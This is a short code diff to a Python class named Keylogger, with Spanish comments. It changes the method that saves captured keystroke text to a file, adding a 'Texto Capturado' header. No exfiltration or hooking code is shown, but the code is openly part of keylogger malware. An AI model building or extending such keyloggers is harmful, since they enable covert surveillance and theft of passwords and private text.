@@ -46,9 +46,12 @@ class Keylogger:
     #Crea el txt con los datos capturados
     def crearTXT(self,captexto):
         archivo = open(self.m,"w")
-        archivo.write(captexto+'\n')
+        archivo.write(captexto)
         archivo.close()
         contador.ContarTxt(self.m)
+        archivo = open(self.m,"w")
+        archivo.write('*********************************Texto Capturado*********************************'+'\n'+captexto+'\n')
+        archivo.close()
         archivo = open("temp.txt","r")
         cadenita=str(archivo.read())
         archivo.close()
